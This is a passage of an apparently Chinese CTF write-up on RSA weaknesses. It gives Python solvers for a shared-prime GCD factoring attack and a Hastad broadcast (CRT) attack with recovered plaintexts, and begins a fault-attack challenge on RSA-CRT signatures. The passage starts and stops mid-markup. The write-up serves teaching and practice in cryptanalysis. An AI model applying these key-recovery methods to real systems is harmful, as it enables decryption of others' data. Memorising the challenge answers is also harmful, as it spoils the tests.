class="hljs-number">15825489607550127439145806852385542839567883239057363905562871179426946402042942076016730509123999510531814642125437244542503343524213169970527943119058139473890975392849048101137592242977766658809403638381196910489834667796018783886181113320540459578692631939111357899549377553003879410941929489345106395564870136122987632435751994319822778186510306221275589605892748144352896531387710390605511956945032387237242470561632107510753242284083264220415607441731463294577007558615036100651711547573054889611720078234249393852435728233068931521415540782361953536967033384859985153392456809560643291691859128343066976633307</span><br><br>The same message (m) was <span class="hljs-keyword">encrypted</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">both</span> keys, what was the message?<br></code></pre></td></tr></table></figure><p>这里说的是一个素数参与了两个n的生成，那么我们可以使用GCD来计算这个素数，从而破解两个N的分解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><br>n1 = <span class="hljs-number">25766855849012170602215974276512994665527760103232878510877708579134451117925205685988667478305686774909581308048305405982227012155215071376134036940929029662904505877622287438422321334710416342122246755031087867738529234615302073381335900455830870395122148361228482894414857023560773160530764583158671668598804795236806439696444767416669004606904236852625407455032822014231606087073213831281114887244532839729675040811323228917519504038450191315875150823702300759184612618800826323992940766242448628052050372979262990010935907002585341542207395142877707331416760094045455941053408610742527475497038936581984374880709</span><br>n2 = <span class="hljs-number">23029445296375982244621042067356938067600932656366159682913502418113458794974570308801738092925111529731228548404356478117663790755942048917363075846055763270676348368932404632553120873938932115409549042302048379540139242329521312179497517707113409555264863436910061516286482903931874204248958042186907817570230042112727883343124487662643844328226394430868012939455393801202299874213974171731230732650780391625138430545738601970201658394385606885566557862983885797334286100689371547075235155161498539779469617285566915877747705913072389949483202393235902365901491091866493162015415874138858126412365811099585224212299</span><br>p = gmpy2.gcd(n1,n2)<br><span class="hljs-keyword">assert</span> sympy.isprime(p)<br>q1 = n1//p<br>q2 = n2//p<br><br>e = <span class="hljs-number">65537</span><br><br>c1 = <span class="hljs-number">10525814866510137434899274998082698726988868256233514176953502719354264032410185277614127761527071749571758119230375451756494965691920242823875047761236402904697195895757175042349370909038642191817523007191322103279536254571467901947532676209111044078805574511874421763608159336854724603736343437950821917939678565773065914042640814861551433414991462029439854218529934675178281414333981877196921950767775395220428028907601554437040987071711361174143526222051997404012801968532202680596542050070864790765315160191871148699455255350919126797448710611287281082665133892808503848186989158095870812598832558333246789042676</span><br>c2 = <span class="hljs-number">15825489607550127439145806852385542839567883239057363905562871179426946402042942076016730509123999510531814642125437244542503343524213169970527943119058139473890975392849048101137592242977766658809403638381196910489834667796018783886181113320540459578692631939111357899549377553003879410941929489345106395564870136122987632435751994319822778186510306221275589605892748144352896531387710390605511956945032387237242470561632107510753242284083264220415607441731463294577007558615036100651711547573054889611720078234249393852435728233068931521415540782361953536967033384859985153392456809560643291691859128343066976633307</span><br><br>d1 = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>))<br>d2 = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q2-<span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">print</span>(gmpy2.powmod(c1,d1,n1))<br><span class="hljs-built_in">print</span>(gmpy2.powmod(c2,d2,n2))<br><br><span class="hljs-comment"># 49298732203100844089802796111250631496813870200781244531168768869337723564648</span><br><span class="hljs-comment"># 49298732203100844089802796111250631496813870200781244531168768869337723564648</span><br></code></pre></td></tr></table></figure><p>得到flag为</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># CTF&#123;ready_some_attacks!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="advanced"><a class="markdownIt-Anchor" href="#advanced"></a> Advanced</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Challenge <span class="hljs-number">7</span>:<br><br>The modular arithmetic aspect of RSA is one of the main security<br>features that prevent trivial decryption of messages. It&#x27;s important<br>that the modulus n reduces the resulting value&#x27;s size. For example, if<br>the encrypting exponent were <span class="hljs-number">3</span> and the ciphertext were <span class="hljs-number">125</span> then a<br>simple cube root would reveal that the encrypted message was<br><span class="hljs-number">5</span>. Because of this, RSA is generally considered insecure when used<br><span class="hljs-string">&quot;raw&quot;</span> like in this challenge. Messages are supposed to be padded in<br>size so that <span class="hljs-number">5</span> becomes something like <span class="hljs-number">100000000</span>...<span class="hljs-number">000005</span>. Exact<br>padding schemes vary and are supposed to have some randomness to<br>them. Also, the encrypting exponent needs to be big enough that<br>encryption operations produce results many times the size of n so that<br>the modulus by n reduces them greatly. Finally, it&#x27;s important that<br>the same message is not encrypted with multiple keys. Using &quot;Chinese<br>Remainder Theorem&quot; (CRT) a message encrypted with multiple keys can be<br>reconstructed if the sum of the modulus size for all the key exceeds<br>the size of the encrypted result (pre-modulus).<br><br>In this challenge, the message getting encrypted is 64 bits and the<br>encrypting exponent is 101. This produces a result that is<br>approximately 101 * 64 = <span class="hljs-number">6500</span> bits. The message is then encrypted<br>with four different <span class="hljs-number">2048</span> bit RSA keys.  The four keys combined are<br>about <span class="hljs-number">8200</span> bits which is bigger than the <span class="hljs-number">6500</span> bit intermediate result<br>of the encryption operation.  Using CRT the <span class="hljs-number">6500</span> bit encrypted message<br>can be recovered and then the 101st integer root can be taken to<br>recover the original 64 bit message.<br><br><br>== Generated Public Key 1 ==<br>Public Modulus (n): <span class="hljs-number">23149105273119</span><span class="hljs-number">85662785009013</span><span class="hljs-number">69199297232618</span><span class="hljs-number">23943624757765</span><span class="hljs-number">17754921986623</span><span class="hljs-number">43844074439836</span><span class="hljs-number">91092738521031</span><span class="hljs-number">05320361447776</span><span class="hljs-number">66569867672862</span><span class="hljs-number">66446444753737</span><span class="hljs-number">59554494647221</span><span class="hljs-number">62245081613861</span><span class="hljs-number">71999255740873</span><span class="hljs-number">45014896855527</span><span class="hljs-number">75968939737976</span><span class="hljs-number">91032923207849</span><span class="hljs-number">75218931315694</span><span class="hljs-number">13773247651277</span><span class="hljs-number">16924091042774</span><span class="hljs-number">57861413785756</span><span class="hljs-number">31300210839317</span><span class="hljs-number">14855059086528</span><span class="hljs-number">31946400475595</span><span class="hljs-number">78757155989389</span><span class="hljs-number">14828284652002</span><span class="hljs-number">92057931675276</span><span class="hljs-number">01427487684976</span><span class="hljs-number">03128211200838</span><span class="hljs-number">06891058146672</span><span class="hljs-number">75587890468539</span><span class="hljs-number">80447659618327</span><span class="hljs-number">54837996582820</span><span class="hljs-number">36635116300846</span><span class="hljs-number">49428450353266</span><span class="hljs-number">65937689630253</span><span class="hljs-number">87116613116140</span><span class="hljs-number">77550561369584</span><span class="hljs-number">23942626477915</span><span class="hljs-number">35947985103955</span><span class="hljs-number">98348794151054</span><span class="hljs-number">50198617328366</span><span class="hljs-number">04865251347976</span><span class="hljs-number">51978877284141</span><span class="hljs-number">20981314262035</span>3<br>Encrypting Exponent (e): 101<br>Encrypted message (c): <span class="hljs-number">41330986748953</span><span class="hljs-number">64475122584859</span><span class="hljs-number">72793663631954</span><span class="hljs-number">21480847233851</span><span class="hljs-number">27010324327313</span><span class="hljs-number">78933439393020</span><span class="hljs-number">64580528703254</span><span class="hljs-number">62125129516244</span><span class="hljs-number">25965510329793</span><span class="hljs-number">79486156327169</span><span class="hljs-number">58036799846515</span><span class="hljs-number">78494359634465</span><span class="hljs-number">91710540994475</span><span class="hljs-number">20291118273021</span><span class="hljs-number">06405933685367</span><span class="hljs-number">10275569679724</span><span class="hljs-number">13169273404209</span><span class="hljs-number">75091948902661</span><span class="hljs-number">78285174609103</span><span class="hljs-number">31013223288149</span><span class="hljs-number">48599985060277</span><span class="hljs-number">75876714405786</span><span class="hljs-number">08610811039866</span><span class="hljs-number">90443140602256</span><span class="hljs-number">14533416055519</span><span class="hljs-number">48558124880741</span><span class="hljs-number">03375412353372</span><span class="hljs-number">14676252727142</span><span class="hljs-number">53906039692619</span><span class="hljs-number">12993919512256</span><span class="hljs-number">60280022301695</span><span class="hljs-number">31368415886389</span><span class="hljs-number">93502062756743</span><span class="hljs-number">56072099132405</span><span class="hljs-number">67022647994916</span><span class="hljs-number">86744403451572</span><span class="hljs-number">36365835994690</span><span class="hljs-number">39313449903333</span><span class="hljs-number">41338945724413</span><span class="hljs-number">87897888086656</span><span class="hljs-number">23522246598817</span><span class="hljs-number">64104264761900</span><span class="hljs-number">06352736111832</span><span class="hljs-number">24626880248944</span><br><br>== Generated Public Key 2 ==<br>Public Modulus (n): <span class="hljs-number">27505003639755</span><span class="hljs-number">30775537749990</span><span class="hljs-number">91167903166665</span><span class="hljs-number">59241048462052</span><span class="hljs-number">70883801902624</span><span class="hljs-number">58760613050325</span><span class="hljs-number">06336142607123</span><span class="hljs-number">27592814091606</span><span class="hljs-number">46236113212674</span><span class="hljs-number">78241118533648</span><span class="hljs-number">69108278020597</span><span class="hljs-number">56758489308910</span><span class="hljs-number">49661612587641</span><span class="hljs-number">41713473144209</span><span class="hljs-number">75491220528890</span><span class="hljs-number">52873494510311</span><span class="hljs-number">76361958124717</span><span class="hljs-number">50942254252953</span><span class="hljs-number">01201416148508</span><span class="hljs-number">86927065079594</span><span class="hljs-number">68822096281699</span><span class="hljs-number">16402212595347</span><span class="hljs-number">07239853677496</span><span class="hljs-number">42587656186833</span><span class="hljs-number">44988682136591</span><span class="hljs-number">52269185576547</span><span class="hljs-number">45918005510033</span><span class="hljs-number">56738950115475</span><span class="hljs-number">98621874886573</span><span class="hljs-number">82560403850181</span><span class="hljs-number">44667288963471</span><span class="hljs-number">02398598177639</span><span class="hljs-number">78346505291254</span><span class="hljs-number">10415157989610</span><span class="hljs-number">91324963800263</span><span class="hljs-number">04207592754247</span><span class="hljs-number">11122746274087</span><span class="hljs-number">21867458120376</span><span class="hljs-number">76284618799427</span><span class="hljs-number">06575343687840</span><span class="hljs-number">84664939872852</span><span class="hljs-number">15757590426438</span><span class="hljs-number">50479174348322</span><span class="hljs-number">70072515285917</span>9<br>Encrypting Exponent (e): 101<br>Encrypted message (c): <span class="hljs-number">17397873644269</span><span class="hljs-number">47826729125390</span><span class="hljs-number">01549804263364</span><span class="hljs-number">03459671349165</span><span class="hljs-number">42238682709304</span><span class="hljs-number">40894308814566</span><span class="hljs-number">74248458455179</span><span class="hljs-number">43847244192660</span><span class="hljs-number">15022531164336</span><span class="hljs-number">46786307394964</span><span class="hljs-number">48816122882054</span><span class="hljs-number">92241203700858</span><span class="hljs-number">07759713752907</span><span class="hljs-number">13350552018895</span><span class="hljs-number">74704775164826</span><span class="hljs-number">77384926622476</span><span class="hljs-number">30323384176319</span><span class="hljs-number">11439207486237</span><span class="hljs-number">04781240926838</span><span class="hljs-number">16850069295355</span><span class="hljs-number">09974648447000</span><span class="hljs-number">43930344936984</span><span class="hljs-number">12438690692636</span><span class="hljs-number">34639847733132</span><span class="hljs-number">48091868400957</span><span class="hljs-number">46501169042776</span><span class="hljs-number">27385768609767</span><span class="hljs-number">87686048652633</span><span class="hljs-number">46852531284195</span><span class="hljs-number">96824176903005</span><span class="hljs-number">70508715990174</span><span class="hljs-number">20069734395480</span><span class="hljs-number">51300699220934</span><span class="hljs-number">54863837154902</span><span class="hljs-number">67735794610384</span><span class="hljs-number">39968099787397</span><span class="hljs-number">56718909588287</span><span class="hljs-number">64776368371097</span><span class="hljs-number">80571608833277</span><span class="hljs-number">74751794582195</span><span class="hljs-number">85218216497145</span><span class="hljs-number">12337566044109</span><span class="hljs-number">47132788906749</span><span class="hljs-number">38571932381488</span><br><br>== Generated Public Key 3 ==<br>Public Modulus (n): <span class="hljs-number">23943992665005</span><span class="hljs-number">71691426574818</span><span class="hljs-number">13780440201632</span><span class="hljs-number">25463944348787</span><span class="hljs-number">13974762007049</span><span class="hljs-number">34410669813492</span><span class="hljs-number">14063664476165</span><span class="hljs-number">98843598582851</span><span class="hljs-number">31888933431550</span><span class="hljs-number">39302311995874</span><span class="hljs-number">37272735942965</span><span class="hljs-number">16394434422582</span><span class="hljs-number">95642274472710</span><span class="hljs-number">39842889311211</span><span class="hljs-number">01818830656767</span><span class="hljs-number">97050367135114</span><span class="hljs-number">33440910772058</span><span class="hljs-number">06743548463287</span><span class="hljs-number">95686014101403</span><span class="hljs-number">67061842988260</span><span class="hljs-number">39192818464392</span><span class="hljs-number">13906309422478</span><span class="hljs-number">55104688378505</span><span class="hljs-number">75161039300445</span><span class="hljs-number">93323333307553</span><span class="hljs-number">09144612029065</span><span class="hljs-number">14248398567498</span><span class="hljs-number">93243675869030</span><span class="hljs-number">84643416215076</span><span class="hljs-number">65965755219057</span><span class="hljs-number">31655641301802</span><span class="hljs-number">63619692031596</span><span class="hljs-number">70625478560592</span><span class="hljs-number">92665187665794</span><span class="hljs-number">38526375414146</span><span class="hljs-number">76293093903112</span><span class="hljs-number">39484966966962</span><span class="hljs-number">30404365543964</span><span class="hljs-number">24710226526474</span><span class="hljs-number">82083941901373</span><span class="hljs-number">18974693576706</span><span class="hljs-number">11227732745422</span><span class="hljs-number">40116211061429</span><span class="hljs-number">83203162744463</span>9<br>Encrypting Exponent (e): 101<br>Encrypted message (c): <span class="hljs-number">19767759825914</span><span class="hljs-number">12071348065438</span><span class="hljs-number">89130029076825</span><span class="hljs-number">84898016181997</span><span class="hljs-number">79332600032926</span><span class="hljs-number">95313315477447</span><span class="hljs-number">85734164928410</span><span class="hljs-number">15108683219817</span><span class="hljs-number">37746832148979</span><span class="hljs-number">41427775071585</span><span class="hljs-number">11490692162773</span><span class="hljs-number">60476102004141</span><span class="hljs-number">57221293720422</span><span class="hljs-number">17846031665756</span><span class="hljs-number">96896152896906</span><span class="hljs-number">67699532754041</span><span class="hljs-number">17277469003564</span><span class="hljs-number">18618410497349</span><span class="hljs-number">06636233903208</span><span class="hljs-number">02464107192038</span><span class="hljs-number">19805289627415</span><span class="hljs-number">03024268715672</span><span class="hljs-number">11143844866702</span><span class="hljs-number">61202562817198</span><span class="hljs-number">21441794618486</span><span class="hljs-number">57359704568147</span><span class="hljs-number">05875308709886</span><span class="hljs-number">50916524194457</span><span class="hljs-number">15105404565111</span><span class="hljs-number">68505608914143</span><span class="hljs-number">66638095586467</span><span class="hljs-number">35067798049443</span><span class="hljs-number">37515219575954</span><span class="hljs-number">86130004535388</span><span class="hljs-number">09288258159184</span><span class="hljs-number">16271780627368</span><span class="hljs-number">31925448026071</span><span class="hljs-number">81177622461258</span><span class="hljs-number">89946575846564</span><span class="hljs-number">78966565710308</span><span class="hljs-number">37156027293551</span><span class="hljs-number">70451675189199</span><span class="hljs-number">34363672571637</span><span class="hljs-number">20745382073790</span>8<br><br>== Generated Public Key 4 ==<br>Public Modulus (n): <span class="hljs-number">23764882147307</span><span class="hljs-number">05602700538692</span><span class="hljs-number">27719671580830</span><span class="hljs-number">00845038109106</span><span class="hljs-number">00377424942363</span><span class="hljs-number">21984858709214</span><span class="hljs-number">35962915038604</span><span class="hljs-number">25899236394268</span><span class="hljs-number">37144876771648</span><span class="hljs-number">40502159532488</span><span class="hljs-number">26224323842227</span><span class="hljs-number">19884472641077</span><span class="hljs-number">69115146700709</span><span class="hljs-number">76208812098742</span><span class="hljs-number">46702975260320</span><span class="hljs-number">23889996339452</span><span class="hljs-number">99892319968541</span><span class="hljs-number">27887488181760</span><span class="hljs-number">01822310309065</span><span class="hljs-number">99393671189573</span><span class="hljs-number">57169141435875</span><span class="hljs-number">37590216206044</span><span class="hljs-number">50135368905820</span><span class="hljs-number">58370895598999</span><span class="hljs-number">00836823313025</span><span class="hljs-number">04296318964395</span><span class="hljs-number">61784421085684</span><span class="hljs-number">22925457393179</span><span class="hljs-number">57255342016508</span><span class="hljs-number">42073996264074</span><span class="hljs-number">06447085305010</span><span class="hljs-number">96116668796229</span><span class="hljs-number">21360797855316</span><span class="hljs-number">24901866292850</span><span class="hljs-number">56925378123392</span><span class="hljs-number">28104595540950</span><span class="hljs-number">09877264479825</span><span class="hljs-number">89207677512851</span><span class="hljs-number">95667240877038</span><span class="hljs-number">37984362767805</span><span class="hljs-number">72283429342365</span><span class="hljs-number">98256438233525</span><span class="hljs-number">93873758485964</span><span class="hljs-number">29810906249929</span>9<br>Encrypting Exponent (e): 101<br>Encrypted message (c): <span class="hljs-number">42005919129551</span><span class="hljs-number">99563979501872</span><span class="hljs-number">44732314661728</span><span class="hljs-number">57860174134570</span><span class="hljs-number">40833853096647</span><span class="hljs-number">25249528217675</span><span class="hljs-number">76673709648910</span><span class="hljs-number">89582307763252</span><span class="hljs-number">79333201411063</span><span class="hljs-number">46845772752415</span><span class="hljs-number">10438935460795</span><span class="hljs-number">62315889509950</span><span class="hljs-number">83565380225707</span><span class="hljs-number">72990943795127</span><span class="hljs-number">10117989182131</span><span class="hljs-number">25500405055973</span><span class="hljs-number">85238071003932</span><span class="hljs-number">12875165097651</span><span class="hljs-number">55863426662639</span><span class="hljs-number">03701969711589</span><span class="hljs-number">52951371564835</span><span class="hljs-number">41843946699828</span><span class="hljs-number">22015645429160</span><span class="hljs-number">86781397961114</span><span class="hljs-number">06093631122262</span><span class="hljs-number">86104769818496</span><span class="hljs-number">18876205056461</span><span class="hljs-number">22273783689677</span><span class="hljs-number">43343698409735</span><span class="hljs-number">24256768752348</span><span class="hljs-number">36138710735832</span><span class="hljs-number">01483076450563</span><span class="hljs-number">74164533769145</span><span class="hljs-number">67987233340038</span><span class="hljs-number">20025909864260</span><span class="hljs-number">55002560798727</span><span class="hljs-number">93049938984906</span><span class="hljs-number">53449697341369</span><span class="hljs-number">98936729321588</span><span class="hljs-number">60976870518018</span><span class="hljs-number">09614329388180</span><span class="hljs-number">44119880719580</span><span class="hljs-number">97088934589833</span><span class="hljs-number">28341875490575</span><br><br>The same message (m) was encrypted with all keys, what was the message?<br></code></pre></td></tr></table></figure><p>这里说的是用不同的n对同一m进行多组的加密，会造成明文的泄露，因为这样我们可以使用中国剩余定理来求解对应的m。</p><p>关于中国剩余定理网上的资料很多这里我就不再赘述了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><br>e = <span class="hljs-number">101</span><br>n1 = <span class="hljs-number">23149105273119856627850090136919929723261823943624757765177549219866234384407443983691092738521031053203614477766656986767286266446444753737595544946472216224508161386171999255740873450148968555277596893973797691032923207849752189313156941377324765127716924091042774578614137857563130021083931714855059086528319464004755957875715598938914828284652002920579316752760142748768497603128211200838068910581466727558789046853980447659618327548379965828203663511630084649428450353266659376896302538711661311614077550561369584239426264779153594798510395598348794151054501986173283660486525134797651978877284141209813142620353</span><br>c1 = <span class="hljs-number">4133098674895364475122584859727936636319542148084723385127010324327313789334393930206458052870325462125129516244259655103297937948615632716958036799846515784943596344659171054099447520291118273021064059336853671027556967972413169273404209750919489026617828517460910331013223288149485999850602777587671440578608610811039866904431406022561453341605551948558124880741033754123533721467625272714253906039692619129939195122566028002230169531368415886389935020627567435607209913240567022647994916867444034515723636583599469039313449903333413389457244138789788808665623522246598817641042647619000635273611183224626880248944</span><br>n2 = <span class="hljs-number">27505003639755307755377499909116790316666559241048462052708838019026245876061305032506336142607123275928140916064623611321267478241118533648691082780205975675848930891049661612587641417134731442097549122052889052873494510311763619581247175094225425295301201416148508869270650795946882209628169916402212595347072398536774964258765618683344988682136591522691855765474591800551003356738950115475986218748865738256040385018144667288963471023985981776397834650529125410415157989610913249638002630420759275424711122746274087218674581203767628461879942706575343687840846649398728521575759042643850479174348322700725152859179</span><br>c2 = <span class="hljs-number">1739787364426947826729125390015498042633640345967134916542238682709304408943088145667424845845517943847244192660150225311643364678630739496448816122882054922412037008580775971375290713350552018895747047751648267738492662247630323384176319114392074862370478124092683816850069295355099746484470004393034493698412438690692636346398477331324809186840095746501169042776273857686097678768604865263346852531284195968241769030057050871599017420069734395480513006992209345486383715490267735794610384399680997873975671890958828764776368371097805716088332777475179458219585218216497145123375660441094713278890674938571932381488</span><br>n3 = <span class="hljs-number">23943992665005716914265748181378044020163225463944348787139747620070493441066981349214063664476165988435985828513188893343155039302311995874372727359429651639443442258295642274472710398428893112110181883065676797050367135114334409107720580674354846328795686014101403670618429882603919281846439213906309422478551046883785057516103930044593323333307553091446120290651424839856749893243675869030846434162150766596575521905731655641301802636196920315967062547856059292665187665794385263754141467629309390311239484966966962304043655439642471022652647482083941901373189746935767061122773274542240116211061429832031627444639</span><br>c3 = <span class="hljs-number">19767759825914120713480654388913002907682584898016181997793326000329269531331547744785734164928410151086832198173774683214897941427775071585114906921627736047610200414157221293720422178460316657569689615289690667699532754041172774690035641861841049734906636233903208024641071920381980528962741503024268715672111438448667026120256281719821441794618486573597045681470587530870988650916524194457151054045651116850560891414366638095586467350677980494433751521957595486130004535388092882581591841627178062736831925448026071811776224612588994657584656478966565710308371560272935517045167518919934363672571637207453820737908</span><br>n4 = <span class="hljs-number">23764882147307056027005386922771967158083000845038109106003774249423632198485870921435962915038604258992363942683714487677164840502159532488262243238422271988447264107769115146700709762088120987424670297526032023889996339452998923199685412788748818176001822310309065993936711895735716914143587537590216206044501353689058205837089559899900836823313025042963189643956178442108568422925457393179572553420165084207399626407406447085305010961166687962292136079785531624901866292850569253781233922810459554095009877264479825892076775128519566724087703837984362767805722834293423659825643823352593873758485964298109062499299</span><br>c4 = <span class="hljs-number">4200591912955199563979501872447323146617285786017413457040833853096647252495282176757667370964891089582307763252793332014110634684577275241510438935460795623158895099508356538022570772990943795127101179891821312550040505597385238071003932128751650976515586342666263903701969711589529513715648354184394669982822015645429160867813979611140609363112226286104769818496188762050564612227378368967743343698409735242567687523483613871073583201483076450563741645337691456798723334003820025909864260550025607987279304993898490653449697341369989367293215886097687051801809614329388180441198807195809708893458983328341875490575</span><br><br><span class="hljs-comment"># CRT</span><br>M = n1*n2*n3*n4<br>M1 = M//n1<br>M2 = M//n2<br>M3 = M//n3<br>M4 = M//n4<br>M1_ = gmpy2.invert(M1,n1)<br>M2_ = gmpy2.invert(M2,n2)<br>M3_ = gmpy2.invert(M3,n3)<br>M4_ = gmpy2.invert(M4,n4)<br>m_e = (c1*M1*M1_ + c2*M2*M2_ + c3*M3*M3_ + c4*M4*M4_) % M<br><br><span class="hljs-built_in">print</span>(gmpy2.iroot(m_e, e))<br><br><span class="hljs-comment"># (mpz(2703076773593937933), True)</span><br><span class="hljs-comment"># 2703076773593937933</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Challenge <span class="hljs-number">8</span>:<br><br>One <span class="hljs-keyword">of</span> the slowest aspects <span class="hljs-keyword">of</span> RSA encryption <span class="hljs-keyword">and</span> decryption operations<br><span class="hljs-keyword">is</span> the need <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span> modular arithmetic mod n. The other operations<br>that are slow are the ones that use the decrypting exponent, d, since<br>d tends <span class="hljs-keyword">to</span> be quite <span class="hljs-keyword">large</span> <span class="hljs-keyword">like</span> n.<br><br>One common optimization <span class="hljs-keyword">is</span> <span class="hljs-keyword">to</span> implement RSA operations mod p <span class="hljs-keyword">and</span> mod q<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">then</span> use the Chinese Remainder Theorem <span class="hljs-keyword">to</span> assemble the smaller<br>results <span class="hljs-keyword">into</span> the final result mod n. This <span class="hljs-keyword">is</span> <span class="hljs-keyword">called</span> RSA-CRT.<br><br>Although RSA-CRT can be substantially faster than traditional RSA, it<br>requires saving p <span class="hljs-keyword">and</span> q <span class="hljs-keyword">as</span> part <span class="hljs-keyword">of</span> the private key <span class="hljs-keyword">and</span> <span class="hljs-keyword">then</span> the<br>intermediate steps <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span> an RSA operation use p <span class="hljs-keyword">and</span> q. <span class="hljs-keyword">If</span> a<br>hardware fault (<span class="hljs-keyword">like</span> a <span class="hljs-type">bit</span> flip) occurs during an operation <span class="hljs-keyword">with</span> p <span class="hljs-keyword">or</span><br>q there <span class="hljs-keyword">is</span> risk that p <span class="hljs-keyword">or</span> q could <span class="hljs-keyword">get</span> exposed <span class="hljs-keyword">in</span> the final calculation<br>result.<br><br><span class="hljs-keyword">In</span> this challenge, two signatures are provided. One signature <span class="hljs-keyword">is</span> <span class="hljs-keyword">valid</span><br><span class="hljs-keyword">and</span> the other signature was produced <span class="hljs-keyword">using</span> RSA-CRT <span class="hljs-keyword">with</span> a fault,<br>resulting <span class="hljs-keyword">in</span> an invalid signature.<br><br><span class="hljs-keyword">Using</span> the faulty signature you need <span class="hljs-keyword">to</span> recover the private key.<br><br>See https://eprint.iacr.org/<span class="hljs-number">2002</span>/<span class="hljs-number">073.</span>pdf <span class="hljs-keyword">for</span> a discussion <span class="hljs-keyword">of</span> this<br>issue <span class="hljs-keyword">and</span> section <span class="hljs-number">2.2</span> <span class="hljs-keyword">for</span> specifics.<br><br>== <span class="hljs-keyword">Generated</span> <span class="hljs-built_in">Public</span> Key ==<br><span class="hljs-built_in">Public</span> Modulus (n): <span class="hljs-number">23154885630854261581442853508324093951285850590669895605587380575521607235130640544163038357995530183077307108610005939771651006915357243729445798049117319493254714109948731131702737721279228901692687894303893338872375856964797219358972744318545166050544352909134282184933180708435651918762591420996061517085207453652776549270709284644419226914688644151059035005050410930727981245377188391115441239955392677194034468965281888607451952614751181223872620212423712394604641694913836491081539520184795848120063846286690175706164225270915188223556103208363481609433822007116992669527079368460205470274996573363959160287149</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><br>Signed Message (m): <span class="hljs-number">76589046204045860242452095050720941865379417190758198073582782077942829633646</span><br><br>Good Message Signature (s): <span class="hljs-number">17325267447814446311355159968784166643403597062830555186292278909407730058965908425047388536352948396884805415515011080230756248824282492130908750756123192695675198318659278263688404328209023590879438869601583177837203307625831869828767421917697572620208858182749108816360161491597773218856070998037376245034974546384410507173259914610628592075718146841935598464732970089109029209226228627059215763957981996096436107902541481923438970091699518171836243620582740860277567287363646182037455413444739511958943032953778117438478454480617990915477445067705592198996202631720932689361239443694873608130401548530381941318233</span><br><br>Bad Message Signature (s): <span class="hljs-number">15560881472440963776812355687263772526799224459493465055411530467812341984615805222376647328602748875265740363403184343010139401584450440120706769134393997687683465315417839518347583296628663097911219566569959436210328102687469397856364290519652485072922276969140055247679930269523169632492462567935396255717642826528934615993335270136129635684773184252764824838098967401117436037823782028218281686360820286858701887330347540973559854295889323011981842854554834266081896736088393072010095414016636556324175277435257379852551709036180461462719357770502022163873660878350507927593844159774420414635489802142702898337920</span><br><br><br>What <span 